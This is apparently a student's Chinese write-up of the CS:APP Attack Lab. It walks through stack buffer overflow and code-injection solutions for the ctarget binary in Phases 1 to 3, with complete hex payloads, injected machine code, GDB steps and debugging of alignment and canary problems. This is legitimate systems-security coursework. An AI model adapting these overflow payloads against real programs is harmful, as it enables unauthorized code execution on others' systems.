# Lab 3 — Attack Lab: Understanding Buffer Overflow Bugs

## 实验目标

通过构造输入字节序列，利用目标程序的栈缓冲区溢出漏洞，改变程序的执行流程，调用指定的目标函数。实验过程中保持 `ctarget`、`rtarget` 二进制文件不变。

与 Bomb Lab 分析程序、寻找满足判断条件的输入不同，本实验重点是理解：输入如何覆盖栈上的数据，以及如何通过返回地址控制程序执行。

## 五个阶段

| 阶段    | 目标程序    | 要完成的事                                                         |
| ------- | ----------- | ------------------------------------------------------------------ |
| Phase 1 | `ctarget` | 利用缓冲区溢出覆盖返回地址，让程序执行 `touch1`                  |
| Phase 2 | `ctarget` | 注入代码，调用 `touch2`，并将 cookie 作为整数参数传入            |
| Phase 3 | `ctarget` | 注入代码，调用 `touch3`，并传入指向 cookie 十六进制字符串的指针  |
| Phase 4 | `rtarget` | 使用已有指令片段组合执行，即 ROP，完成 `touch2` 的调用与参数传递 |
| Phase 5 | `rtarget` | 使用 ROP，完成 `touch3` 的调用与字符串指针传递                   |

代码注入是让程序执行输入中包含的机器指令；ROP（返回导向编程）则利用程序已有的、通常以 `ret` 结尾的短指令片段（gadget），组合出需要的操作。

## 文件说明

| 文件              | 用途                                                    |
| ----------------- | ------------------------------------------------------- |
| `ctarget`       | Phase 1～3 使用的目标程序                               |
| `rtarget`       | Phase 4～5 使用的目标程序                               |
| `cookie.txt`    | 本实验实例的 cookie，用于目标函数的参数验证             |
| `farm.c`        | `rtarget` 中 gadget farm 的源代码，可辅助寻找指令片段 |
| `hex2raw`       | 将十六进制文本转换成实际输入字节                        |
| `attacklab.pdf` | 实验说明，包含输入格式、允许的攻击范围及各阶段规则      |

## 基本流程

1. 查看 `attacklab.pdf` 中当前阶段的目标和限制。
2. 用 `objdump` 查看反汇编，用 GDB 观察栈布局、返回地址和参数寄存器。
3. 将构造的输入字节写成十六进制文本，再用 `hex2raw` 转成原始输入。
4. 把字节输入对应的目标程序，检查是否触发指定函数并通过参数验证。

重点复习 CSAPP 第三章的栈与函数调用、寄存器传参、机器指令编码及缓冲区溢出防护。具体的可用地址和 gadget 范围以实验文件为准。

## Phase 1

### 操作步骤

以下步骤以 `attacklab` 目录为当前目录，并针对本目录里的 `ctarget`。这份程序启动时会检查主机名；如果看到 `illegal host [主机名]`，先在当前 WSL 会话设置为二进制白名单中的名称，再继续：

```bash
sudo hostname whaleshark.ics.cs.cmu.edu
hostname
```

确认 `hostname` 输出为 `whaleshark.ics.cs.cmu.edu`。这个设置用于当前 WSL 会话，重启后可能需要重新设置。

#### 1. 导出并查看整份反汇编

在 `attacklab` 目录运行：

```bash
objdump -d ctarget > ctarget_disassembly.txt
```

这会把 `ctarget` 的反汇编保存到 `ctarget_disassembly.txt`。直接 Ctrl+F。

先看 `<test>` 中调用 `getbuf` 的位置，确认程序会经过 `getbuf`；再看 `<getbuf>`，重点找 `sub $0x28,%rsp`、`mov %rsp,%rdi` 和调用 `Gets` 的指令；最后看 `<touch1>` 标题左边的地址。以下地址和指令都来自这份反汇编文件。

#### 2. 在 GDB 中读取运行时栈指针

```bash
gdb ./ctarget
```

在 GDB 提示符下输入：

```gdb
(gdb) break getbuf
(gdb) run
(gdb) info registers rsp
(gdb) x/gx $rsp
```

`break getbuf` 会在 `getbuf` 第一条指令执行前停下。`info registers rsp` 显示此刻的栈指针；`x/gx $rsp` 查看该地址处的 8 字节内容。函数入口处 `%rsp` 指向保存的返回地址。本次运行中入口 `%rsp` 是 `0x5561dca0`。这是运行时栈地址示例，不需要把它加上 64。

#### 3. 从反汇编计算缓冲区与返回地址的距离

在 `ctarget_disassembly.txt` 的 `<getbuf>` 部分找到：

```asm
00000000004017a8 <getbuf>:
  4017a8: 48 83 ec 28           sub    $0x28,%rsp
  4017ac: 48 89 e7              mov    %rsp,%rdi
  4017af: e8 8c 02 00 00        call   401a40 <Gets>
```

`sub $0x28,%rsp` 表示 `getbuf` 执行时把栈指针减去 `0x28`，即 40 字节；随后 `mov %rsp,%rdi` 把新的栈指针作为缓冲区地址传给 `Gets`。因此缓冲区起始位置是入口 `%rsp - 0x28`。本次运行中是 `0x5561dca0 - 0x28 = 0x5561dc78`。

入口 `%rsp` 指向保存的返回地址，而缓冲区从新 `%rsp` 开始，所以保存的返回地址位于缓冲区起始处往后 `0x28`（40）字节。输入前 40 字节填充到返回地址，接下来 8 字节覆盖它。64 位地址本身占 8 字节，不能把“64 位”当成 64 字节偏移。

如果想在 GDB 里亲自核对计算，可以在断点处单步执行反汇编中的前两条指令：

```gdb
(gdb) stepi
(gdb) info registers rsp
(gdb) stepi
(gdb) info registers rdi rsp
```

第一条 `stepi` 后，`%rsp` 应比入口值小 `0x28`；第二条后，`%rdi` 应与新的 `%rsp` 相同。以本次地址为例，二者都是 `0x5561dc78`。这一步是用 GDB 验证从反汇编得出的结论；Phase 1 的偏移也可以直接由 `sub` 指令算出。

Phase 1 只需覆盖保存的返回地址，不需要把跳转目标指向缓冲区，因此不必把栈地址写进输入。换一次运行时，栈地址可能不同；本次运行记录的地址只用于理解栈布局。

#### 4. 从反汇编找到 `touch1` 地址并按小端序写入

在 `ctarget_disassembly.txt` 中找到 `<touch1>:`，标题左边就是函数地址。本实验这份二进制中地址是 `0x4017c0`。目标地址要写满 8 字节；x86-64 使用小端序，所以最低位字节放在最前面：

```text
地址：0x00000000004017c0
字节：c0 17 40 00 00 00 00 00
```

#### 5. 创建输入文件

在另一个终端或退出 GDB 后，在 `attacklab` 目录创建 `phase1.txt`。文件中写入 40 个填充字节，再紧接着写入 `touch1` 地址的 8 个字节：

```text
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

每个两位十六进制数代表一个字节；前四行共 40 字节，用来填充到返回地址，最后一行的 8 字节覆盖返回地址。这里用 `00` 作为填充值，其他可输入字节也可以用于填充。

#### 6. 转换并运行

在 `attacklab` 目录运行：

```bash
./hex2raw < phase1.txt | ./ctarget -q
```

`hex2raw` 把文本中的十六进制字节转换成原始字节，再通过管道交给 `ctarget`。`-q` 表示不向课程服务器提交结果。成功时，程序会显示 `Touch1!` 相关提示，表明返回地址已被改写并执行了 `touch1`。

## Phase 2

### 目标与关键地址

Phase 2 要让 `touch2(unsigned val)` 收到 cookie。反汇编中 `touch2` 将 `%edi` 与全局 `cookie` 比较，因此注入代码要先把 cookie 放进 `%edi`，再转到 `touch2`。

`touch2` 的主要逻辑可以概括为：

```c
void touch2(unsigned val) {
    vlevel = 2;
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        /* 输出失败提示 */
        fail(2);
    }
    exit(0);
}
```

这是根据反汇编整理的逻辑示意：入口参数 `val` 通过 `%edi` 传入；参数与全局 `cookie` 相等时验证 Phase 2，否则调用失败处理函数。

本实验实例的 cookie 是 `0x59b997fa`，与 `cookie.txt` 一致；`touch2` 地址是 `0x4017ec`。

### 查询 cookie

最直接的方式是在实验目录查看 `cookie.txt`：

```bash
cat cookie.txt
```

也可以在 GDB 中读取程序初始化后的全局变量。在 `getbuf` 处暂停时，`initialize_target` 已经运行完毕：

```gdb
(gdb) break getbuf
(gdb) run
(gdb) x/wx 0x6044e4
0x6044e4 <cookie>: 0x59b997fa
```

如果在 `main` 入口就检查 `0x6044e4`，初始化尚未发生，读到 `0` 是正常的。

```text
mov $0x59b997fa, %edi    bf fa 97 b9 59
ret                      c3
touch2 地址（小端）       ec 17 40 00 00 00 00 00
```

### 控制流与输入布局

`getbuf` 的缓冲区起始地址到保存的返回地址相距 `0x28`（40）字节。输入前 40 字节到达保存的返回地址，因此偏移 40 放缓冲区地址；`getbuf` 的 `ret` 跳到注入代码。注入代码自己的 `ret` 再从当前栈顶取出 `touch2` 地址。

第一次尝试把 `touch2` 地址放在偏移 48。完整输入如下：偏移 0 放注入代码，偏移 40 放缓冲区地址，偏移 48 放 `touch2` 地址。

```text
bf fa 97 b9 59 c3 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 ec 17
40 00 00 00 00 00
```

这组输入确实执行了 `touch2` 并通过 cookie 验证，但随后出现段错误。获取 `getbuf` 入口 `%rsp` 和缓冲区地址的详细步骤见 Phase 1。按该次运行记录的地址，第一次 `ret` 后 `%rsp` 为 `0x5561dca8`；第二次 `ret` 取出 `touch2` 地址后，`touch2` 入口 `%rsp` 为 `0x5561dcb0`，其对 16 取余为 0。

按 x86-64 System V 调用约定，函数入口通常要求 `%rsp % 16 == 8`。为了让注入代码的 `ret` 跳过一个 8 字节槽位，在它前面执行 `add $8, %rsp`，其机器码是 `48 83 c4 08`。注意指令顺序必须是 `mov`、`add`、`ret`；若 `ret` 写在 `add` 前，`add` 不会执行。

### 对齐后的候选输入

`add` 执行后，`ret` 从偏移 56 取出 `touch2` 地址。因此偏移 40 仍放缓冲区地址，偏移 48 放一个 8 字节占位槽，偏移 56 放 `touch2` 地址：

```text
bf fa 97 b9 59 48 83 c4 08 c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

其中缓冲区地址 `0x5561dc78` 是一次运行时观察到的示例；如果本次运行地址不同，需要更新偏移 40 处的地址。将字节保存到 `phase2.txt` 后运行：

```bash
./hex2raw < phase2.txt | ./ctarget -q
```

检查结果时，先确认出现 `Touch2!` 和 `Valid solution for level 2`，再确认程序是否正常结束。上述对齐后的布局是根据栈位置推导的候选输入，需在当前运行环境中实际验证。

## Phase 3

跟 Phase 2 思路类似：仍然用「注入代码 + 覆盖返回地址」控制执行流，注入代码最后的 `ret` 从偏移 56 取出 `touch3` 地址。区别是这次要传的不是整数，而是一个字符串的地址，所以除了改参数寄存器，还得把字符串放进内存并算出它的地址。

### 1. 目标与关键地址

`touch3(char *sval)` 内部调用 `hexmatch(cookie, sval)` 校验字符串，因此 `sval` 必须恰好等于 cookie 的 8 位小写十六进制表示。本实例 cookie 是 `0x59b997fa`，所以字符串是 `"59b997fa"`，共 9 字节（8 个字符 + 结尾 `'\0'`）：

```text
'5' '9' 'b' '9' '9' '7' 'f' 'a' '\0'
35  39  62  39  39  37  66  61  00
```

| 项目 | 值 |
| --- | --- |
| `touch3` 地址 | `0x4018fa`，小端 `fa 18 40 00 00 00 00 00` |
| `hexmatch` 地址 | `0x40184c` |
| 全局 `cookie` | `0x59b997fa`（与 `cookie.txt` 一致） |
| 缓冲区基址 `base`（本次运行） | `0x5561dc78` |
| 返回地址槽 | `base + 0x28` = `base + 40` = `0x5561dca0` |
| 注入代码 `ret` 取跳转地址的槽 | `base + 56` = `0x5561dcb0` |

`base` 的来历见 Phase 1：`getbuf` 入口 `%rsp` 是 `0x5561dca0`，`sub $0x28,%rsp` 后缓冲区从 `0x5561dca0 - 0x28 = 0x5561dc78` 开始。换一次运行栈地址可能不同，需要用 GDB 重新确认，并把下面所有写死的地址一起替换。

### 2. 从反汇编确认参数寄存器

先看 `touch3`：

```asm
00000000004018fa <touch3>:
  4018fa: 53                    push   %rbx
  4018fb: 48 89 fb              mov    %rdi,%rbx
  4018fe: c7 05 d4 2b 20 00 03  movl   $0x3,0x202bd4(%rip)        # 6044dc <vlevel>
  401905: 00 00 00
  401908: 48 89 fe              mov    %rdi,%rsi
  40190b: 8b 3d d3 2b 20 00     mov    0x202bd3(%rip),%edi        # 6044e4 <cookie>
  401911: e8 36 ff ff ff        call   40184c <hexmatch>
```

两条信息：

1. 函数一进来就 `mov %rdi,%rbx` 保存入参，且此时 `%rdi` 还没被写过，说明 `touch3` 的字符串指针来自 **`%rdi`**（x86-64 第一个参数寄存器）。
2. `mov %rdi,%rsi` + `mov cookie,%edi` 说明它只是把指针挪到第二个参数位置，去调用 `hexmatch(cookie, sval)`：`%edi` 是 `val`，`%rsi` 是 `sval`。

再看 `hexmatch`：

```asm
000000000040184c <hexmatch>:
  40184c: 41 54                 push   %r12
  40184e: 55                    push   %rbp
  40184f: 53                    push   %rbx
  401850: 48 83 c4 80           add    $0xffffffffffffff80,%rsp
```

`hexmatch` 里 `sprintf(s, "%.8x", val)` 生成 8 位小写十六进制，`strncmp(sval, s, 9)` 比较 9 个字节（8 个字符 + `'\0'`），所以字符串必须是小写、8 位、以 `'\0'` 结尾。

### 3. 第一次尝试（失败）

按 Phase 2 的模板套过来：偏移 0 放注入代码，偏移 40 放注入代码地址，偏移 56 放 `touch3` 地址。

字符串最初的想法是「放在返回地址槽下面」：返回地址槽往前 9 字节就是字符串起点。

```text
48 bf 97 dc 61 55 00 00 00 00
48 83 c4 08 c3 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 35 39 62 39 39 37 66 61 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
```

运行结果：

```text
Misfire: You called touch3("� ��")
FAIL
```

说明流程本身是对的（`touch3` 已被调用），但字符串指针不对。这里有两个错误：

1. **参数寄存器用错**：写成了 `mov $0x5561dc90, %rsi`（机器码 `48 be ...`），但 `touch3` 从 `%rdi` 取指针，`%rsi` 是它内部才用的。应改成 `mov $..., %rdi`（`48 bf ...`）。
2. **地址算错**：最初把返回地址槽当成 `0x5561dca8`（`base + 48`），实际是 `base + 40 = 0x5561dca0`。所以字符串起点 = `0x5561dca0 - 9 = 0x5561dc97`，小端 `97 dc 61 55 00 00 00 00`，而不是 `0x5561dc90`。

### 4. 第二次尝试（失败：被 push 覆盖）

改成 `%rdi` 并修正地址后：

```text
48 bf 97 dc 61 55 00 00 00 00
48 83 c4 08 c3 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 35 39 62 39 39 37 66 61 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
```

运行结果变成空串：

```text
Misfire: You called touch3("")
```

原因是 `hexmatch` 自己在比较之前会先压栈，把 `base+24 ~ base+47` 这段踩掉。从进入 `touch3` 开始的完整轨迹：

| 时刻 | `rsp` | 写入范围 |
| --- | --- | --- |
| 进入 `touch3` | `base+64` | — |
| `touch3`：`push %rbx` | `base+56` | `56 ~ 63` |
| `touch3`：`call hexmatch` | `base+48` | `48 ~ 55`（返回地址） |
| `hexmatch`：`push %r12` | `base+40` | `40 ~ 47` |
| `hexmatch`：`push %rbp` | `base+32` | `32 ~ 39` |
| `hexmatch`：`push %rbx` | `base+24` | `24 ~ 31` |
| `hexmatch`：`add $-128,%rsp` | `base-104` | 局部帧继续向下 128 字节 |

字符串放在 `31 ~ 39`，正好横跨 `24~31` 的最后一个字节和 `32~39` 整格：`push %rbp` 盖掉 8 个字符，`push %rbx` 又把 `base+31` 写成栈地址的最高字节 `0x00`，于是首字节变 `\0`，打印出空串。

### 5. 第三次尝试（失败：被金丝雀覆盖）

把字符串挪到 buffer 低地址、紧跟注入代码：

```text
48 bf 87 dc 61 55 00 00 00 00
48 83 c4 08 c3 35 39 62 39 39
37 66 61 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
```

字符串从偏移 15 开始，地址 `0x5561dc78 + 15 = 0x5561dc87`，小端 `87 dc 61 55 00 00 00 00`。

结果只剩一个字符：

```text
Misfire: You called touch3("5")
```

这次是**栈金丝雀**踩的。算 `hexmatch` 的帧：

```text
入口 rsp = base+48          （touch3 已 push rbx，再 call 压返回地址）
push r12 / rbp / rbx        → rsp = base+24
add $-128,%rsp              → rsp = base-104
mov %rax,0x78(%rsp)         → 金丝雀写在 base-104+0x78 = base+16
```

所以整个帧的归属是：

| 范围 | 内容 |
| --- | --- |
| `base-104 ~ base+3` | `cbuf`（`sprintf` 最多写到 `base+3`） |
| `base+4 ~ base+15` | 空闲 |
| `base+16 ~ base+23` | 栈金丝雀（最低字节固定 `0x00`） |
| `base+24 ~ base+47` | 三个 `push` |
| `base+48 ~ base+55` | `call hexmatch` 的返回地址 |
| `base+56 ~ base+63` | `touch3` 的 `push %rbx` |

字符串放在 `15 ~ 23`，15 上的 `'5'` 幸存，`16 ~ 23` 全被金丝雀覆盖（首字节是 `0x00`），所以只剩 `"5"`。

结论：在 64 字节输入、且只能用前 16 字节放「代码 + 字符串」的情况下，代码必须压到 7 字节以内。

### 6. 第四次尝试（缩短代码，待验证）

把 10 字节的 `mov $imm64, %rdi` 换成 5 字节的 32 位形式，再用 1 字节的 `pop %rax` 代替 4 字节的 `add $8,%rsp`（两者都只是让 `ret` 跳过 8 字节）：

```asm
bf 7f dc 61 55    mov $0x5561dc7f, %edi   ; 字符串地址 = base+7（base=0x5561dc78）
58                pop %rax                ; 跳过 base+48，保持对齐
c3                ret                     ; 跳到偏移 56 的 0x4018fa
```

说明：

- `mov $imm32, %edi` 会把 32 位立即数零扩展进 `%rdi`，地址 `0x5561dc7f` 小于 `0x80000000`，所以安全。
- 代码共 7 字节，占偏移 `0 ~ 6`；字符串放 `7 ~ 15`，正好避开 `16 ~ 23` 的金丝雀区。
- 对齐验证：`getbuf` 的 `ret` 后 `rsp = base+48`；`pop %rax` 后 `rsp = base+56`；`ret` 弹出 `0x4018fa` 后 `rsp = base+64`。`base = 0x5561dc78`，`base+64 = 0x5561dcb8`，对 16 取余为 8，符合函数入口要求。

完整输入（64 字节）：

```text
bf 7f dc 61 55 58 c3 35 39 62
39 39 37 66 61 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
fa 18 40 00 00 00 00 00
```

各段含义：

| 偏移 | 内容 |
| --- | --- |
| `0 ~ 6` | 注入代码（`mov` + `pop` + `ret`） |
| `7 ~ 15` | `"59b997fa\0"` |
| `16 ~ 39` | 填充（16~23 被金丝雀踩，24~39 被 push 踩，都无所谓） |
| `40 ~ 47` | 返回地址 `0x5561dc78`（小端 `78 dc 61 55 00 00 00 00`） |
| `48 ~ 55` | 填充（给 `pop %rax` 跳过） |
| `56 ~ 63` | `touch3` 地址 `0x4018fa`（小端 `fa 18 40 00 00 00 00 00`） |

运行：

```bash
./hex2raw < phase3.txt | ./ctarget -q
```

预期输出 `Bang!: You called touch3("59b997fa")` 并显示通过；`-q` 表示不向课程服务器提交。若再次出现 `Misfire`，先用 GDB 在 `getbuf` 处确认 `base`，再同步修改偏移 2~5 的地址和偏移 40 的返回地址。

### 7. 本阶段的有效区间总结

以 64 字节输入、`base = 0x5561dc78` 为前提，进 `hexmatch` 比较之前各偏移的状态：

| 偏移 | 地址 | 归属 | 能否放字符串 |
| --- | --- | --- | --- |
| `0 ~ 3` | `base+0 ~ 3` | 注入代码前 4 字节；`sprintf` 在随机偏移取到最大时才可能写到 `base+3`，那时代码已经执行完 | 代码可以 |
| `4 ~ 6` | `base+4 ~ 6` | 空闲，`cbuf` 写不到 | 代码可以 |
| `7 ~ 15` | `base+7 ~ 15` | 空闲 | 可以 |
| `16 ~ 23` | `base+16 ~ 23` | `hexmatch` 栈金丝雀 | 不可以 |
| `24 ~ 31` | `base+24 ~ 31` | `hexmatch` 的 `push %rbx` | 不可以 |
| `32 ~ 39` | `base+32 ~ 39` | `hexmatch` 的 `push %rbp` | 不可以 |
| `40 ~ 47` | `base+40 ~ 47` | 返回地址槽（首次 `ret` 已消费），之后被 `push %r12` 覆盖 | 不可以 |
| `48 ~ 55` | `base+48 ~ 55` | `call hexmatch` 的返回地址 | 不可以 |
| `56 ~ 63` | `base+56 ~ 63` | 注入代码 `ret` 读的 `touch3` 地址，之后被 `touch3` 的 `push %rbx` 覆盖 | 不可以 |

所以真正能自由使用的只有 `base+4 ~ base+15` 这 12 字节：代码 7 字节 + 字符串 9 字节刚好挤进 `0 ~ 15`（`0 ~ 3` 即使被 `sprintf` 覆盖也不影响，因为代码早已执行完）。
